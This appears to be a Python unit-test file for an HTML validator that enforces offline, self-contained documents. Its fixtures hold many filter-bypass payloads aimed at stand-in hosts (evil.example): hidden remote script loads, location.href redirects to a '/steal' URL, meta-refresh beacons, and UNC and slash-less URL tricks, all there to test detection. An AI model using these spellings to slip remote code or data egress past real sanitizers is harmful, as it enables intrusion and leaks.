from _validate_helpers import *


class NewCheckTests(unittest.TestCase):
    """Coverage for the self-contained-guarantee, embedded-comment schema, duplicate-heading,
    canvas-report-all, and --strict additions."""

    def _body(self, main, *extra):
        return [HANDLED_REGION, EMBEDDED_REGION, comment_ui(), main] + list(extra) + [JS_REGION]

    def _errs_warns(self, content):
        return _validate_text(content)

    # -- self-contained guarantee -------------------------------------------------- #
    def test_external_img_src_errors(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="https://example.com/x.png" alt="x">')
        errors, _ = self._errs_warns(build(body=self._body(main)))
        self.assertTrue(any("loads over the network" in e for e in errors), errors)

    def test_local_path_img_warns_not_errors(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="images/x.png" alt="x">')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("local path" in w for w in warnings), warnings)

    def test_data_uri_img_is_clean(self):
        main = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="data:image/png;base64,AAAA" alt="x">')
        errors, warnings = self._errs_warns(build(body=self._body(main)))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_external_script_src_errors(self):
        errors, _ = self._errs_warns(build(body=self._body(MAIN, '<script src="https://evil.cdn/x.js"></script>')))
        self.assertTrue(any("self-contained guarantee" in e for e in errors), errors)

    def test_a_script_hidden_behind_a_bogus_cdata_comment_still_errors(self):
        # CMH-VAL-21: in HTML content `<![CDATA[` is a bogus comment ending at the first `>`,
        # so this <script> is LIVE and fetches remote code. The tag lookup this check reads used
        # to be a bare HTMLParser, which swallowed the whole marked section and reported no
        # script at all, so the document passed the self-contained guarantee.
        smuggled = '<![CDATA[><script src="//evil.example/x.js"></script>]]>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, smuggled)))
        self.assertTrue(any("self-contained guarantee" in e and "evil.example" in e
                            for e in errors), errors)

    def test_chartjs_cdn_script_is_exempt_from_self_contained_error(self):
        script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
        errors, _ = self._errs_warns(build(body=self._body(MAIN, script)))
        self.assertFalse(any("self-contained guarantee" in e for e in errors), errors)

    def test_offline_mode_rejects_chartjs_cdn_script(self):
        script = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>'
        doc = with_offline_mode(build(body=self._body(MAIN, script)))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "Chart.js" in e for e in errors), errors)

    def test_offline_mode_rejects_network_resources_and_css_imports(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            '@import "https://cdn.example.com/theme.css";\n'
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }")
        main = MAIN.replace(
            "<p>content</p>",
            '<img src="https://example.com/x.png" alt="x">\n'
            '<iframe src="https://example.com/f.html"></iframe>\n'
            '<video poster="https://example.com/poster.png"><track src="https://example.com/c.vtt"></video>')
        extras = [
            '<link rel="stylesheet" href="https://example.com/app.css">',
            '<script src="https://example.com/app.js"></script>',
        ]
        doc = with_offline_mode(build(css=css, body=self._body(main, *extras)))
        errors, _ = self._errs_warns(doc)
        for needle in ("<img", "<iframe", "<video", "<track", "<link", "<script", "@import"):
            self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                            "expected offline error for %s, got %r" % (needle, errors))

    def test_offline_mode_accepts_inlined_data_resources(self):
        main = MAIN.replace(
            "<p>content</p>",
            '<img src="data:image/png;base64,AAAA" alt="x">\n'
            '<video poster="data:image/png;base64,AAAA"></video>')
        doc = with_offline_mode(build(body=self._body(main)))
        errors, warnings = self._errs_warns(doc)
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    def test_offline_mode_requires_restrictive_csp(self):
        errors, _ = self._errs_warns(with_offline_mode(build(), csp=False))
        self.assertTrue(any("Content-Security-Policy" in e for e in errors), errors)
        weak = with_offline_mode(build()).replace("form-action 'none'; ", "", 1)
        errors, _ = self._errs_warns(weak)
        self.assertTrue(any("form-action 'none'" in e for e in errors), errors)

    def test_offline_mode_rejects_network_form_actions(self):
        main = MAIN.replace(
            "<p>content</p>",
            '<form action="https://example.com/post"><button formaction="//example.com/button">Send</button>'
            '<input formaction="https://example.com/input" value="Send"></form>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(main))))
        for needle in ("<form action", "<button formaction", "<input formaction"):
            self.assertTrue(any("offline mode" in e and needle in e for e in errors),
                            "expected offline form error for %s, got %r" % (needle, errors))

    def test_offline_mode_rejects_network_meta_refresh(self):
        doc = with_offline_mode(build(body=self._body(MAIN, '<meta http-equiv="refresh" content="0; url=https://example.com/out">')))
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors), errors)
        # The BEACON wording specifically, not just any refresh rejection: every refresh is now an
        # error, so without this the network branch could collapse into the generic message and the
        # target parser CMH-VAL-08 keeps would stop being exercised in the positive direction.
        self.assertTrue(any("points at a network URL" in e for e in errors), errors)

    def test_offline_mode_rejects_a_meta_refresh_that_omits_the_url_keyword(self):
        # The `url=` keyword is OPTIONAL in the HTML shared declarative refresh steps: once the
        # time and its `;`/`,`/whitespace separator are consumed, anything that is not `url` is
        # taken as the URL itself. So dropping four characters was a cheaper bypass than the
        # scheme-only spelling this gate was widened for.
        for content in ("0;https://evil.example",
                        "0;https:evil.example",
                        "0,https://evil.example",
                        "0 https://evil.example",
                        "0;'https:evil.example'",
                        "0;url= https:evil.example",
                        "0;url=' https://evil.example'",
                        "0.5;https://evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors),
                            "expected an offline meta refresh error for %r, got %r" % (content, errors))

    def test_offline_mode_rejects_a_meta_refresh_with_a_remote_file_authority(self):
        # A special scheme's relative-slash state treats `\` like `/`, so on a `file://` document
        # `\\host` resolves to `file://host/...` - a UNC fetch off the machine, and a top-level
        # navigation the CSP cannot stop either. The explicit `file:` spelling of the same host
        # has to count for the same reason.
        for content in ("0;url=\\\\evil.example/out",
                        "0;url=/\\evil.example/out",
                        "0;url=file://evil.example/share/x.html",
                        "0;url=file:\\\\evil.example\\share\\x.html",
                        "0;file://evil.example/share/x.html"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors),
                            "expected an offline meta refresh error for %r, got %r" % (content, errors))

    def test_offline_mode_rejects_a_scheme_only_meta_refresh(self):
        # A browser resolves `https:evil.example` against a file:// document exactly as it
        # resolves `https://evil.example`, and a meta refresh is a TOP-LEVEL NAVIGATION, which no
        # meta-delivered CSP can restrict - so while the gate required the slashes, the whole
        # channel was open to a one-token spelling change.
        for content in ("0;url=https:evil.example",
                        "0; url='http:evil.example/out'",
                        "0;URL=HTTPS:evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors),
                            "expected an offline meta refresh error for %r, got %r" % (content, errors))

    def test_offline_mode_rejects_a_local_meta_refresh_too(self):
        # The exporter removes EVERY `meta[http-equiv=refresh]` whatever its target, so a file
        # carrying a relative one is a file an export would change - and a refresh is a TOP-LEVEL
        # NAVIGATION no meta-delivered CSP can restrict, which an injected `<base href>` rebases
        # onto the network. The gate errored only on a network target, so both sides disagreed.
        for content in ("5;url=./x.html", "0;url=#a", "30", "0;url=data:text/html,x"):
            with self.subTest(content=content):
                doc = with_offline_mode(build(body=self._body(
                    MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
                errors, _ = self._errs_warns(doc)
                # The GENERIC branch by its own wording, so an inverted branch selection (or a
                # collapse of the two messages into one) cannot leave this green.
                self.assertTrue(any("whatever its target" in e for e in errors), (content, errors))

    def test_offline_mode_names_a_network_meta_refresh_target_only_when_there_is_one(self):
        # Every refresh is rejected (above), but the two messages must stay distinguishable: only
        # a target a browser resolves to a network host earns the beacon wording. These are the
        # false-positive controls for the target parser: each is a value a browser either resolves
        # INSIDE the file or does not treat as a refresh at all. `url=https:...` with no time is
        # not a refresh (the algorithm returns when the time is empty), the quoted value is
        # TRUNCATED at its closing quote so the `url=https:` inside it is ordinary path text, and
        # the keyword's `=` may be preceded only by ASCII whitespace - an NBSP makes the whole
        # tail a relative reference.
        for content in ("5;url=./x.html",
                        "0;url=#a",
                        "0;url=sub/page.html",
                        "30",
                        "url=https:evil.example",
                        "0;url='./x;url=https:evil.example'",
                        "0;url\u00a0=https:evil.example",
                        "0;url=data:text/html,x",
                        "0;url=./x.html?url=https://evil.example",
                        "0;url=foo.html;url=https:evil.example",
                        "0;remark url=https:evil.example",
                        "0;url=https:",
                        "0;url=http:",
                        "0;url=https://",
                        "0;url=\\x.html",
                        "0;urhttps://evil.example",
                        "0;urlhttps://evil.example",
                        "0;u'https://evil.example'",
                        "0;url https://evil.example",
                        "0;url=https: ",
                        "0;url=file:///C:/x.html",
                        "0;url=file://localhost/x.html",
                        "0;url=file:notes.html",
                        "0;url=http\u017f://evil.example"):
            doc = with_offline_mode(build(body=self._body(
                MAIN, '<meta http-equiv="refresh" content="%s">' % content)))
            errors, _ = self._errs_warns(doc)
            self.assertFalse(any("points at a network URL" in e for e in errors),
                             "unexpected network meta refresh error for %r: %r" % (content, errors))
            self.assertTrue(any("meta refresh" in e for e in errors),
                            "expected the generic meta refresh error for %r: %r" % (content, errors))

    def test_offline_mode_rejects_network_resources_inside_noscript(self):
        # A <noscript> body is raw TEXT only while scripting is enabled; with scripting off a
        # browser parses it and really does load what it names. The EGRESS checks must
        # therefore fail CLOSED on the fallback markup - the redirect and the image below are
        # live for exactly the reader who cannot run the layer at all.
        fallback = ('<noscript><meta http-equiv="refresh" content="0;url=//evil.example/out">'
                    '<img src="//evil.example/x.png" alt="x"></noscript>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertTrue(any("offline mode" in e and "meta refresh" in e for e in errors), errors)
        self.assertTrue(any("evil.example/x.png" in e for e in errors), errors)

    def test_a_csp_meta_inside_noscript_does_not_satisfy_the_offline_policy(self):
        # The mirror image: a PRESENCE check must read the browser's view, not the fallback
        # superset. A scripting-enabled browser never creates this element, so it cannot be the
        # document's policy - reading it would suppress the missing-CSP error outright.
        doc = with_offline_mode(build(body=self._body(MAIN)), csp=False)
        doc = doc.replace("<head>\n",
                          '<head>\n<noscript><meta http-equiv="Content-Security-Policy" '
                          'content="%s"></noscript>\n' % OFFLINE_CSP, 1)
        errors, _ = self._errs_warns(doc)
        self.assertTrue(any("missing Content-Security-Policy" in e for e in errors), errors)

    def test_an_unclosed_noscript_still_contributes_its_fallback_markup(self):
        # A browser runs an unclosed raw-text element to end of document, so the fallback markup
        # after it is still live for a scripting-disabled reader.
        fallback = '<noscript><img src="//evil.example/x.png" alt="x">'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, fallback))))
        self.assertTrue(any("evil.example/x.png" in e for e in errors), errors)

    def test_a_document_whose_tag_index_fails_is_reported_not_passed(self):
        # "Could not look" must not read like "nothing more to find": the self-contained
        # guarantee is derived from the tag index, so a failed index is its own error.
        from checks import parsing as _parsing
        doc = build(body=self._body(MAIN))
        _parsing._tag_attr_index.cache_clear()
        self.addCleanup(_parsing._tag_attr_index.cache_clear)
        with mock.patch.object(_parsing, "_TagAttrParser", side_effect=RuntimeError("boom")):
            errors, _ = self._errs_warns(doc)
        self.assertTrue(any("could not parse the document for the self-contained" in e
                            for e in errors), errors)

    def test_validate_releases_the_shared_tag_index(self):
        from checks import parsing as _parsing
        self._errs_warns(build(body=self._body(MAIN)))
        self.assertEqual(_parsing._tag_attr_index.cache_info().currsize, 0)

    def test_offline_mode_rejects_network_css_urls(self):
        css = CSS_REGION.replace(
            ":root { --cp-bg: #ffffff; --cp-text: #000000; }",
            ":root { --cp-bg: #ffffff; --cp-text: #000000; background-image: url(https://example.com/bg.png); }")
        main = MAIN.replace("<p>content</p>", '<p style="background: url(//example.com/inline.png)">content</p>')
        errors, _ = self._errs_warns(with_offline_mode(build(css=css, body=self._body(main))))
        for needle in ("style block", "inline style"):
            self.assertTrue(any("offline mode" in e and "url(" in e and needle in e for e in errors),
                            "expected offline CSS url error for %s, got %r" % (needle, errors))

    def test_offline_mode_allows_non_fetching_network_links(self):
        links = (
            '<link rel="canonical" href="https://example.com/report">\n'
            '<link rel="alternate" href="https://example.com/report.atom" type="application/atom+xml">\n'
            '<link rel="author" href="https://example.com/about">'
        )
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, links))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # An offline export used to skip four reserved layer ids BEFORE testing whether the script
    # was runnable, so a decoy that merely borrowed one bypassed both of its strips (#822). The
    # validator never had that skip, which is the asymmetry that let the exporter preserve a
    # script its own --strict gate then rejected. Pin the validator side in both directions so a
    # future "make them agree" change cannot resolve the disagreement by adding the skip here.
    def test_offline_egress_check_exempts_no_reserved_layer_id(self):
        reserved = ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
                    "cmhVendoredRichLibs", "reviewedSections")
        for rid in reserved:
            with self.subTest(reserved_id=rid):
                decoy = ('<script type="text/javascript" id="%s">\n'
                         'import("https://evil.example/x.js");\n'
                         '</script>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, decoy))))
                self.assertTrue(any("imports a network module" in e for e in errors), (rid, errors))
                nav = ('<script type="text/javascript" id="%s">\n'
                       'window.location.href = "https://evil.example/steal";\n'
                       '</script>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nav))))
                self.assertTrue(any("direct top-level " in e for e in errors), (rid, errors))

    # A genuinely inert data block carrying the same text is DATA, not code: the exporter now
    # repairs a runnable-typed reserved block into one of these rather than deleting it, so the
    # validator must keep accepting the repaired shape.
    def test_offline_egress_check_ignores_an_inert_reserved_block_quoting_egress(self):
        quote = ('<script type="application/json" id="reviewedSections">\n'
                 '{"x": "import(\\"https://evil.example/x.js\\") and location.href = '
                 '\\"https://evil.example/steal\\""}\n'
                 '</script>')
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, quote))))
        self.assertFalse(any("imports a network module" in e or "direct top-level " in e for e in errors), errors)

    # An SVG <script> loads through `href` (SVG2) or the legacy `xlink:href`, never `src`, so the
    # resource check missed it entirely and blessed such a file as offline-clean (#881). The
    # exporter strips the same shape, so the gate has to see it too or the two disagree. The
    # padded value is browser-real: a URL parser strips leading whitespace before it parses, so
    # ` https://...` loads - and the exporter's own predicate trims, so a validator that did not
    # would bless a file the strip had cleaned.
    def test_offline_mode_rejects_an_svg_script_that_loads_through_href(self):
        for attr in ("href", "xlink:href"):
            for url in ("https://evil.example/x.js", "//evil.example/x.js",
                        " \t https://evil.example/x.js"):
                with self.subTest(attr=attr, url=url):
                    svg = '<svg><script %s="%s"></script></svg>' % (attr, url)
                    errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                    self.assertTrue(any("offline mode" in e and "<script %s" % attr in e for e in errors),
                                    (attr, url, errors))

    # Borrowing a reserved layer id buys no exemption from the LOAD check either: the exporter
    # neutralizes such a block into inert data, but a remote load is what the strip removes outright,
    # so the gate must flag it rather than read the id and look away.
    def test_offline_mode_rejects_a_reserved_id_svg_script_that_loads_through_href(self):
        for rid in ("embeddedComments", "handledCommentIds", "commentableHtmlLayer",
                    "reviewedSections", "cmhVendoredRichLibs"):
            with self.subTest(reserved_id=rid):
                svg = ('<svg><script id="%s" href="https://evil.example/x.js"></script></svg>' % rid)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (rid, errors))

    def test_offline_mode_accepts_a_relative_or_data_svg_script_reference(self):
        svg = ('<svg><script href="svg-local-keep.js"></script>'
               '<script xlink:href="data:text/javascript,void%200"></script></svg>')
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, svg))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # A browser normalizes several spellings INTO a network URL before it fetches (issue #923), so
    # the gate must read the value the way the URL parser does. Both implementations used to test
    # the raw literal and call every one of these local, which is under-detection rather than a
    # disagreement: the exporter left the load in place and the gate then certified the file.
    def test_offline_mode_rejects_a_browser_normalized_network_reference(self):
        for url in ("https:/\\evil.example/x.js", "\\\\evil.example/x.js",
                    "ht\ttps://evil.example/x.js", "https:\n//evil.example/x.js",
                    "file://evil.example/x.js", "file:\\\\evil.example/x.js",
                    "file:////evil.example/x.js"):
            with self.subTest(url=url):
                markup = ('<img src="%s"><svg><script href="%s"></script></svg>' % (url, url))
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertTrue(any("offline mode" in e and "<img src" in e for e in errors),
                                (url, errors))
                self.assertTrue(any("offline mode" in e and "<script href" in e for e in errors),
                                (url, errors))

    # ...and the spellings that stay ON the machine must still pass, or the gate would reject an
    # offline file with no egress at all: a `file:` URL with an empty host, `localhost`, or a Windows
    # DRIVE LETTER in the host position (which the URL parser turns into a path), and a backslash
    # inside an ordinary relative path.
    def test_offline_mode_accepts_a_local_file_or_backslash_relative_reference(self):
        for url in ("file:///C:/local/x.js", "file:///local/x.js", "file://localhost/local/x.js",
                    "file://C:/local/x.js", "file://c|/local/x.js", "file:////C:/local/x.js",
                    "sub\\local-keep.js", "/root\\local-keep.js"):
            with self.subTest(url=url):
                markup = '<svg><script href="%s"></script></svg>' % url
                errors, warnings = self._errs_warns(
                    with_offline_mode(build(body=self._body(MAIN, markup))))
                self.assertEqual(errors, [], (url, errors))
                self.assertEqual(warnings, [], (url, warnings))

    # A `srcset` candidate is tokenized before the URL predicate sees it, and HTML draws that
    # boundary at ASCII whitespace only. Splitting on the ENGINE's whitespace cut the candidate at a
    # U+000B and hid a real load from both implementations.
    def test_offline_mode_reads_a_srcset_candidate_the_way_html_tokenizes_it(self):
        markup = '<img src="local.png" srcset="\u0001\u000b//evil.example/x.png 1x">'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, markup))))
        self.assertTrue(any("offline mode" in e and "<img srcset" in e for e in errors), errors)

    # The self-contained guarantee is not offline-only: a shareable document that loads a script
    # over the network is an error however the load is spelled.
    def test_shareable_mode_rejects_a_script_that_loads_through_href(self):
        for attr in ("href", "xlink:href"):
            with self.subTest(attr=attr):
                svg = '<svg><script %s="https://evil.example/x.js"></script></svg>' % attr
                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    # The Chart.js CDN opt-in is bound to `src`, because `check_charts` only validates a `src`
    # loader's pinned version and SRI. Exempting an `href` would wave through a remote script with
    # a chart-shaped filename that nothing else in the validator ever looks at.
    def test_the_chartjs_cdn_exemption_does_not_extend_to_a_script_href(self):
        for attr in ("href", "xlink:href"):
            with self.subTest(attr=attr):
                svg = '<svg><script %s="https://evil.example/z/chart.min.js"></script></svg>' % attr
                errors, _ = self._errs_warns(build(body=self._body(MAIN, svg)))
                self.assertTrue(any("self-contained guarantee" in e and "<script %s" % attr in e
                                    for e in errors), (attr, errors))

    # A `speculationrules` or `importmap` block is ACTIVE but is not JavaScript, so the
    # executable-type predicate never looked at it: a speculation ruleset makes the browser
    # prefetch/prerender (a `"source": "document"` one needs no URL literal at all), and an import
    # map re-points where a bare module specifier resolves - which the literal
    # `import "https://..."` scan cannot see. The exporter removes every ruleset and every import
    # map that is not entirely relative, so the gate must reject a hand-authored offline file that
    # keeps one, in every spelling JSON allows.
    def test_offline_mode_rejects_active_data_blocks(self):
        cases = (
            ("speculationrules", "", '{"prerender": [{"urls": ["https://evil.example/beacon"]}]}'),
            # No URL literal anywhere: the ruleset prefetches the document's own links.
            ("speculationrules", "", '{"prefetch": [{"source": "document"}]}'),
            # Even a purely relative ruleset goes: it exists only to fetch.
            ("speculationrules", "", '{"prerender": [{"urls": ["next.html"]}]}'),
            # An external ruleset or map is unreviewable and cannot be self-contained.
            ("speculationrules", ' src="rules.json"', ""),
            ("importmap", ' src="map.json"', '{"imports": {"lib": "./lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "https://evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "//evil.example/lib.js"}}'),
            # A backslash opens an authority for a special scheme exactly as a slash does.
            ("importmap", "", '{"imports": {"lib": "/\\\\evil.example/lib.js"}}'),
            # JSON permits an escaped solidus and a \\uXXXX escape for any character, and the URL
            # parser strips padding and an embedded tab - a text scan closes one of these.
            ("importmap", "", '{"imports": {"lib": "https:\\/\\/evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "https:\\u002f\\u002fevil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "  https://evil.example/lib.js"}}'),
            ("importmap", "", '{"imports": {"lib": "htt\\tps://evil.example/lib.js"}}'),
            # A data:/blob: target maps a bare specifier onto code the document never carried.
            ("importmap", "", '{"imports": {"lib": "data:text/javascript,export default 1"}}'),
            ("importmap", "", '{"imports": {"lib": "blob:https://evil.example/x"}}'),
            # A scopes KEY is a reference too.
            ("importmap", "", '{"scopes": {"https://cdn.example/": {"lib": "./lib.js"}}}'),
            # A browser hard-fails an unparseable map, so failing closed loses nothing.
            ("importmap", "", "not json at all"),
        )
        for stype, attr, body in cases:
            with self.subTest(type=stype, attr=attr, body=body):
                block = '<script type="%s"%s>%s</script>' % (stype, attr, body)
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("offline mode" in e and stype in e for e in errors),
                                (stype, attr, body, errors))

    # The controls: an entirely relative import map is legitimate content and must survive, and a
    # MIME-parameter type is NOT one of these keyword types, so it is inert data a browser ignores
    # and the gate must leave alone (deleting an author's inert block is the costlier error).
    def test_offline_mode_accepts_local_and_parameterized_active_data_blocks(self):
        blocks = (
            '<script type="importmap">{"imports": {"lib": "./lib.js", "app": "/app.js"}}</script>',
            '<script type="importmap">{"scopes": {"/inner/": {"lib": "./inner.js"}}}</script>',
            '<script type="importmap;charset=utf-8">'
            '{"imports": {"lib": "https://evil.example/lib.js"}}</script>',
            '<script type="text/plain">{"prerender": [{"urls": ["https://evil.example/x"]}]}</script>',
        )
        errors, warnings = self._errs_warns(
            with_offline_mode(build(body=self._body(MAIN, "\n".join(blocks)))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # `<template>` content is preserved verbatim by serialization and a second script can adopt
    # and insert it, so the exporter's inline-egress scan now descends into it. The validator's
    # parser deliberately drops template content, so it could not see such a script at all - which
    # is exactly the disagreement that would let --strict bless a file the exporter strips.
    def test_offline_egress_check_sees_a_template_parked_script(self):
        cases = (
            ('<script type="text/javascript">import("https://evil.example/x.js");</script>',
             "imports a network module"),
            ('<script type="text/javascript">window.location.href = "https://evil.example/steal";</script>',
             "direct top-level "),
            ('<script type="importmap">{"imports": {"lib": "https://evil.example/lib.js"}}</script>',
             "importmap"),
            ('<script type="speculationrules">{"prefetch": [{"source": "document"}]}</script>',
             "speculationrules"),
        )
        for inner, needle in cases:
            with self.subTest(inner=inner):
                block = "<template id=\"parked\">\n%s\n</template>" % inner
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any(needle in e for e in errors), (inner, errors))
                # ...and the same block nested a second template deep, which is what the exporter's
                # recursive walk exists for.
                nested = "<template id=\"outer\"><template id=\"inner\">\n%s\n</template></template>" % inner
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, nested))))
                self.assertTrue(any(needle in e for e in errors), ("nested", inner, errors))

    def test_offline_check_sees_template_parked_network_css(self):
        block = ('<template id="parked-css">\n'
                 "<style>.x { background-image: url(https://evil.example/bg.png); }</style>\n"
                 '<p style="background: url(//evil.example/inline.png)">x</p>\n'
                 "</template>")
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        for needle in ("style block", "inline style"):
            self.assertTrue(any("offline mode" in e and "url(" in e and needle in e for e in errors),
                            (needle, errors))

    # The control: a template holding only local content is legitimate and must stay clean.
    def test_offline_check_accepts_a_local_template(self):
        block = ('<template id="ok">\n'
                 '<style>.x { color: #123456; }</style>\n'
                 '<script type="text/javascript">window.__ok = 1;</script>\n'
                 '<script type="importmap">{"imports": {"lib": "./lib.js"}}</script>\n'
                 '<img src="data:image/png;base64,AAAA" alt="x">\n'
                 "</template>")
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # The exporter removes every `on*` attribute; a gate that did not look would certify a
    # hand-authored offline file the export would have changed - and an inline handler is exactly
    # the channel the offline CSP cannot close.
    def test_offline_mode_rejects_inline_event_handlers(self):
        for block in ('<button id="go" onclick="location.href=\'https://evil.example/x\'">go</button>',
                      '<img id="pixel" alt="x" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" '
                      'onload="location.href=\'https://evil.example/x\'">',
                      '<template id="parked-handler"><button onclick="alert(1)">go</button></template>'):
            with self.subTest(block=block):
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("the export scrubs it" in e for e in errors), (block, errors))

    def test_offline_mode_rejects_an_on_prefixed_attribute_that_is_not_a_handler(self):
        # The gate's test is the exporter's literal `^on`, which also takes `once` and `onward` -
        # the exporter really does `removeAttribute("once")`, so a validator that were cleverer
        # than the strip would bless an attribute the export removes. The message must then claim
        # only what the predicate decides, not assert that the attribute runs code.
        block = '<div id="probe" once="1" onward="x">text</div>'
        errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        for attr in ("once", "onward"):
            # The FORMATTED head, which names one attribute, rather than a phrase the static
            # message text carries anyway - otherwise both iterations assert the same thing and a
            # drift that flagged only one of the two would stay green.
            self.assertTrue(any('<div %s="...">' % attr in e for e in errors), (attr, errors))

    def test_offline_mode_rejects_an_event_handler_only_a_dom_walk_reaches(self):
        # The exporter scrubs `on*` off every element `querySelectorAll("*")` reaches on a
        # DOMParser document, where scripting is OFF - so it reaches a self-closed FOREIGN
        # element and the markup inside a `<noscript>`. The gate read the document parser's
        # start-tag scan instead, which RETURNS before that scan for a self-closed foreign
        # element and sees a `<noscript>` body as raw TEXT, so both shapes rode into a file
        # `--strict` then certified as offline-clean.
        for block in ('<svg viewBox="0 0 1 1"><rect width="1" height="1" '
                      'onload="location.href=\'https://evil.example/x\'"/></svg>',
                      '<noscript><button onclick="location.href=\'https://evil.example/x\'">'
                      "go</button></noscript>",
                      '<template id="parked-svg"><svg><rect onload="alert(1)"/></svg></template>'):
            with self.subTest(block=block):
                errors, _ = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
                self.assertTrue(any("the export scrubs it" in e for e in errors), (block, errors))

    def test_offline_mode_accepts_a_document_without_event_handlers(self):
        block = ('<button id="go" data-onclick="not a handler">go</button>'
                 '<svg viewBox="0 0 1 1"><rect width="1" height="1" fill="#123456"/></svg>'
                 '<noscript><p data-only="text">enable scripting</p></noscript>')
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(MAIN, block))))
        self.assertEqual(errors, [], errors)
        self.assertEqual(warnings, [], warnings)

    # A <base href> loads nothing itself, so neither this gate nor the export strip looked at one -
    # and both treat a RELATIVE reference as safe, which is the whole control case. A base element
    # REBASES every relative reference in the document onto the base it names, so the very relative
    # image or script reference both sides read as local fetches off-host instead. The exporter
    # clears the same attribute, so the gate has to see it too or the two disagree (#924).
    #
    # The spellings matter here in a way they do not for a single resource: a base is held to the
    # stricter `offline_is_non_local_ref` rather than the `//`-requiring network predicate, because
    # a browser resolves `https:evil.example/` and `https:/\evil.example/` to a remote host too and
    # for a base that would defeat the whole check (a #923 residual the CSP absorbs for one
    # attribute is a document-wide rebase here).
    def test_offline_mode_rejects_a_base_href_that_points_at_the_network(self):
        beacon = MAIN.replace("<p>content</p>", '<p>content</p>\n  <img src="beacon.png" alt="x">')
        # The pairing this row exists for: the relative reference alone is NOT an error.
        errors, warnings = self._errs_warns(with_offline_mode(build(body=self._body(beacon))))
        self.assertEqual(errors, [], errors)
        self.assertTrue(any("local path" in w for w in warnings), warnings)
        cases = (
            '<base href="https://evil.example/">',
            '<base href="//evil.example/">',
            # A browser strips leading C0 controls and spaces before it parses a URL.
            '<base href=" \thttps://evil.example/">',
            # Slash-less and backslash spellings a WHATWG URL parser still resolves to a host.
            '<base href="https:evil.example/">',
            '<base href="https:/evil.example/">',
            '<base href="https:/\\evil.example/">',
            # An SMB/UNC authority leaks credentials from a file:// document.
            '<base href="file://evil.example/share/">',
            '<base href="\\\\evil.example\\share\\">',
            # A scheme the file cannot resolve on its own is non-local however it is spelled.
            '<base href="blob:https://evil.example/x">',
            # A template-parked base is inert until a script adopts the fragment and inserts it,
            # which is when it starts rebasing - the same reason the other offline checks walk in.
            '<template id="parked-base"><base href="https://evil.example/"></template>',
        )
        for base in cases:
            with self.subTest(base=base):
                doc = with_offline_mode(build(body=self._body(beacon, base)))
                errors, _ = self._errs_warns(doc)
                self.assertTrue(any("offline mode" in e and "<base href" in e for e in errors),
                                (base, errors))

